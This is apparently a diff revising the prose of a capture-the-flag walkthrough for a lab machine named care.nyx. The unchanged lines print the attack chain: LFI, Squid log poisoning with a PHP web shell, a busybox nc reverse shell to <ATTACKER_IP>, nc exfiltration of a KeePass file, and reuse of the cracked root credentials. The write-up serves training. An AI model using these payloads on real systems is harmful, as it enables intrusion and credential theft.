@@ -14,9 +14,9 @@ A Local File Inclusion vulnerability in `page.php` is chained with the Squid pro
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn care.nyx
@@ -28,7 +28,7 @@ PORT     STATE SERVICE     REASON
 MAC Address: 08:00:27:95:F3:C9 (Oracle VirtualBox virtual NIC)
 ```
 
-Three ports are found open: **22 (SSH)**, **80 (HTTP)**, and **3128**, the default port for the Squid proxy. A version/script scan against all three fills in the details:
+Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **3128**, the default port for the Squid proxy. A version and script scan on all three fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80,3128 -sCV care.nyx
@@ -59,7 +59,8 @@ The main page:
 ```
 http://care.nyx
 ```
-<img src="..\Images\care\Pasted image 20260717165048.png"/>
+
+<img src="../Images/care/Pasted image 20260717165048.png"/>
 
 A content discovery scan turns up a page worth a closer look:
 
@@ -89,9 +90,9 @@ server-status         [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 7
 
 > **Endpoint:** `http://care.nyx/page.php?i=`
 
-#### LFI Discovery
+### Local File Inclusion
 
-The `i` parameter looks like it's including a file. `ffuf` is used with a dedicated LFI wordlist to see which payloads produce a different response than the baseline:
+The `i` parameter looks like it's including a file. `ffuf` runs a dedicated LFI wordlist to see which payloads produce a different response than the baseline:
 
 ```bash
 $ ffuf -u 'http://care.nyx/page.php?i=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 7
@@ -100,31 +101,33 @@ $ ffuf -u 'http://care.nyx/page.php?i=FUZZ' -w /usr/share/wordlists/seclists/Fuz
 :: Progress: [930/930] :: Job [1/1] :: 930/930] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
 ```
 
-Confirmed directly:
+A quick check confirms it directly:
 
 ```
 view-source:http://care.nyx/page.php?i=/etc/passwd
 ```
-<img src="..\Images\care\Pasted image 20260717165107.png"/>
+
+<img src="../Images/care/Pasted image 20260717165107.png"/>
 
 ## Initial Access
 
 ### Remote Code Execution via Squid Log Poisoning
 
-With arbitrary local file inclusion confirmed, the next question is which readable file can be turned into attacker-controlled PHP. Two log files are checked:
+With arbitrary local file inclusion confirmed, the next question is which readable file can be turned into attacker-controlled PHP. Two log files are candidates:
 
 ```
 http://care.nyx/page.php?i=/var/log/apache2/access.log
 ```
-<img src="..\Images\care\Pasted image 20260717165252.png"/>
+
+<img src="../Images/care/Pasted image 20260717165252.png"/>
 
 ```
 http://care.nyx/page.php?i=/var/log/squid/access.log
 ```
-<img src="..\Images\care\Pasted image 20260717165321.png"/>
 
+<img src="../Images/care/Pasted image 20260717165321.png"/>
 
-The Squid access log is the one that gets used. A request is sent *through* the Squid proxy itself, with the User-Agent header set to a PHP web shell one-liner:
+The Squid access log is the one to use. A request goes *through* the Squid proxy itself, with the User-Agent header set to a PHP web shell one-liner:
 
 ```bash
 $ curl -sX GET --proxy "http://care.nyx:3128" "http://127.0.0.1:80" -A '<?php system($_GET["cmd"]); ?>'
@@ -137,7 +140,7 @@ $ curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=id" | t
 <ATTACKER_IP> [17/Jul/2026:16:06:23 +0200] "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
 ```
 
-With arbitrary command execution confirmed, the same technique is used to trigger a reverse shell. The payload is URL-encoded first, since it needs to survive as a query string value:
+With arbitrary command execution confirmed, the same technique triggers a reverse shell. The payload is URL-encoded first, since it needs to survive as a query string value:
 
 ```bash
 $ echo -n 'busybox nc <ATTACKER_IP> <PORT> -e /bin/sh' | jq -sRr @uri
@@ -154,7 +157,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -175,10 +178,9 @@ total 4
 drwx------ 3 dorian dorian 4096 Oct  2  2025 dorian
 www-data@care:/var/www/html$ ls -l /home/dorian
 ls: cannot open directory '/home/dorian/user.txt': Permission denied
-www-data@care:/var/www/html$
 ```
 
-`sudo -l` is checked next to see what the current user can run as someone else:
+`sudo -l` shows what `www-data` can run as another user:
 
 ```bash
 www-data@care:/var/www/html$ sudo -l
@@ -200,8 +202,6 @@ uid=1000(dorian) gid=1000(dorian) groups=1000(dorian)
 ```
 
 ```bash
-dorian@care:/var/www/html$ id
-uid=1000(dorian) gid=1000(dorian) groups=1000(dorian)
 dorian@care:~$ ls -l /home/dorian
 total 4
 -r-------- 1 dorian dorian 33 Oct  2  2025 user.txt
@@ -233,7 +233,7 @@ dorian@care:~$ file /home/dorian/.bak/data.txt
 /home/dorian/.bak/data.txt: Keepass password database 2.x KDBX
 ```
 
-`data.txt` is identified as a KeePass database. It's exfiltrated to the attacker box over a raw `nc` transfer — the attacker side listens and redirects the incoming stream to a file, the target side sends the file into a connection to that listener:
+`data.txt` is a KeePass database despite its `.txt` extension. It comes off the box over a raw `nc` transfer — the attacker side listens and redirects the incoming stream to a file, the target side sends the file into a connection to that listener:
 
 ```bash
 # Attacker machine
@@ -243,7 +243,7 @@ $ nc -lvp <PORT> > data.txt
 nc <ATTACKER_IP> <PORT> < /home/dorian/.bak/data.txt
 ```
 
-With the file renamed to its real extension, its password hash is extracted and cracked:
+With the file renamed to its real extension, `keepass2john` extracts the hash and `KDBXcrack` cracks it against `rockyou.txt`:
 
 ```bash
 $ cp data.txt data.kdbx
@@ -274,8 +274,9 @@ The database opens with that password and holds a set of SSH credentials:
 ```bash
 $ keepassxc
 ```
-<img src="..\Images\care\Pasted image 20260717162523.png"/>
-<img src="..\Images\care\Pasted image 20260717162636.png"/>
+
+<img src="../Images/care/Pasted image 20260717162523.png"/>
+<img src="../Images/care/Pasted image 20260717162636.png"/>
 
 > **Credentials:** `root:r00tB0$$123!`
 
@@ -283,7 +284,7 @@ $ keepassxc
 
 ### Shell as root
 
-Rather than a local exploit, escalation here comes from valid credentials recovered from the vault. They're validated against SSH first:
+Rather than a local exploit, escalation here comes from valid credentials recovered from the vault. `hydra` validates them against SSH first:
 
 ```bash
 $ hydra -l 'root' -p 'r00tB0$$123!' ssh://care.nyx
@@ -309,7 +310,6 @@ total 4
 root@care:~# cat /root/root.txt
 3ba0b1d7e2e14ffd1f5b9788aa957bfd
 ```
-
 
 > **Root flag:** `3ba0b1d7e2e14ffd1f5b9788aa957bfd`
 
